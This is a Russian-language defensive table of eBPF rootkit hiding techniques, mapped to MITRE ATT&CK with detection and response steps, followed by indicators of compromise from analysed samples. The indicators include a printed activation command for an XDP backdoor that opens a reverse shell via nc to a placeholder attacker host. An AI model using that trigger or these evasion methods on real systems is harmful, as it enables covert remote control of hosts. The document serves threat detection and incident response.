# TTP-таблица: сокрытие eBPF-имплантов → детект → реакция

| # | Техника сокрытия | Примеры (образцы/семейства) | MITRE ATT&CK | Как детектить | Реакция |
|---|---|---|---|---|---|
| 1 | **Скрытие PID/файлов через `getdents64`**: на входе запоминается адрес буфера, на выходе `d_reclen` предыдущей записи растягивается на запись-цель — `ls`/`readdir` её пропускают | `cotsom/eBPF-rootkit` (bpf.c), LinkPro, bad-bpf, pidhide | T1564.001 (Hide Artifacts: Hidden Files), T1014 (Rootkit) | `bpftool prog list` → kprobe/tracepoint на `sys_enter/exit_getdents64`; `bpf_printk`-маркеры в `trace_pipe` (`[PID_HIDE]`); сверка `ls` с прямым `stat /proc/<pid>`; Sandfly `process_running_hidden_stealth` | `bpftool prog delete id=…`, unpin, kill загрузчика; сверить с baseline |
| 2 | **XDP-бэкдор с magic-пакетом**: программа на `xdp` сканирует входящие пакеты, триггер → команда в map → юзерспейс исполняет shell; триггерный пакет дропается (`XDP_DROP`) | `putaom0l1/ebpf_xdp_backdoor` (`HACKE_BY_PUTAO…END`), boopkit, LinkPro `xdp_ingress` | T1205 (Traffic Signaling: Port Knocking) | `bpftool net show dev <if>` / `ip -d link` (prog_id на xdp); строки-триггеры в бинарнике/памяти (`strings`); аномальные односторонние UDP/TCP-дампы; auditd `bpf` | `ip link set dev <if> xdp off`; `bpftool prog delete`; kill юзерспейс-читателя map |
| 3 | **Командный канал через BPF map**: ядро кладёт команду в hash-map, юзерспейс-демон вычитывает и исполняет | `xdp_blackdoor_s1mple.c` (map `commands`, поле `processed`) | T1059.004 (Unix Shell), T1095 (Non-Application Layer Protocol) | `bpftool map dump name commands`; поиск процессов, держащих fd на map; auditd `-S bpf -F a0=26` (map_update) | Дамп и изъятие map как улику → `bpftool map delete`/unpin → kill демона |
| 4 | **Самоскрытие BPF-объектов**: перехват `sys_enter_bpf`, на `BPF_PROG_GET_NEXT_ID`/`MAP_GET_NEXT_ID`/`LINK_GET_NEXT_ID` возвращается `-ENOENT` → `bpftool` «слепой» | LinkPro (bpf_override_return), ebpfkit | T1562.001 (Impair Defenses) | **Расхождение каналов**: объекты в `/sys/fs/bpf` есть, `bpftool prog list` пуст/короткий; сравнение счётчиков `/proc/sys/kernel/bpf*`-статистики; детектор, загруженный ДО руткита | Независимый канал (детектор с раннего boot, внешние пробы); в крайнем случае — офлайн-форензика/пересборка |
| 5 | **Пиннинг в bpffs как персистентность**: программа/карта закреплена файлом в `/sys/fs/bpf`, живёт после смерти загрузчика | LinkPro, boopkit, любые «freeze»-импланты | T1546 (Event Triggered Execution), T1505.003 | Baseline-drift: новые файлы в bpffs; `bpftool prog show -f` (имена pinned); auditd `-w /sys/fs/bpf/ -p wa` | `rm` pin → `bpftool link delete` → `prog delete` (порядок в bpf_purge.sh) |
| 6 | **Глушение телеметрии**: перехват `bpf_ringbuf_submit`/`perf_event_output` — события Falco/Tracee/Tetragon не доходят до юзерспейса, инструменты «работают», но слепы | SPiCa (research), LKM-руткиты нового поколения | T1562.001 (Impair Defenses) | Heartbeat-канарейка: известное событие (тестовый exec) не появилось в SIEM; NMI/аппаратный heartbeat; внешние пробы с другого хоста | Считать хост скомпрометированным; форензика памяти; пересборка из чистого образа |
| 7 | **`ld.so.preload` fallback**: если `CONFIG_BPF_KPROBE_OVERRIDE` недоступен, юзерленд-библиотека через `/etc/ld.so.preload` | LinkPro fallback, классические юзерленд-руткиты | T1574.006 (Hijack Execution Flow: LD_PRELOAD) | Файл не пуст; auditd `-w /etc/ld.so.preload -p wa`; неожиданные `.so` в списке | Очистить файл, найти источник записи, проверить все `.so` в preload |
| 8 | **io_uring-скрытие syscall-активности**: операции через io_uring не порождают обычных сисколлов → сисколл-телеметрия пустая | ARMO research 2025, io_uring-руткиты | T1562.001 | Несоответствие: сетевая активность есть, сисколлов нет; мониторинг `io_uring_setup/enter` через eBPF | `sysctl kernel.io_uring_disabled=2` (ядра 6.6+); запрет io_uring политикой |
| 9 | **Classic-BPF сокет-фильтры**: фильтр на raw/packet-сокет ловит magic-пакет, юзерспейс активируется | BPFDoor, Symbiote (обновления 2025: IPv6, новые маркеры) | T1205, T1095 | `ss -0unp`/`/proc/net/packet`; фильтры сокетов в `/proc/net/*`; FortiGuard IOC (магические байты 0x7255/0x5293) | Kill процесса-владельца сокета; удалить фильтр вместе с fd |
| 10 | **Скрытие юзерленд-процессов**: mount-namespace, `hidepid=2`, PID-namespace | Легитимная техника, но юзается и атакующими (haxrob) | T1564.001 | `mount \| grep hidepid`; сравнение `/proc` из host-ns через `nsenter` | `nsenter -t 1 -m ps auxf` — истина из host-namespace |

## Ключевые IOC из разобранных образцов

**cotsom/eBPF-rootkit (bpf.c):**
- tracepoint-хуки: `sys_enter_getdents64`, `sys_exit_getdents64` (×2, tail-call PROG_01/PROG_02)
- маркер `bpf_printk`: `[PID_HIDE] filename previous/next one`
- ringbuf `rb` (256 KB) — события успешного патчинга в юзерспейс
- параметр `pid_to_hide` (volatile const) — PID прячется по имени папки `/proc/<pid>`

**putaom0l1/ebpf_xdp_backdoor (xdp_blackdoor_s1mple.c):**
- триггер: UDP-пакет payload ровно 200 байт, префикс `HACKE_BY_PUTAO`, команда до маркера `END`
- пример активации: `printf %-200s 'HACKE_BY_PUTAO  /bin/sh -i 2>&1|nc <attacker> 666   END' | nc <victim> 80 -u`
- hash-map `commands` (cmd[100] + processed) — обмен ядро→юзерспейс
- триггерный пакет возвращается `XDP_DROP` (не доходит до сетевого стека — не виден в netfilter-логах)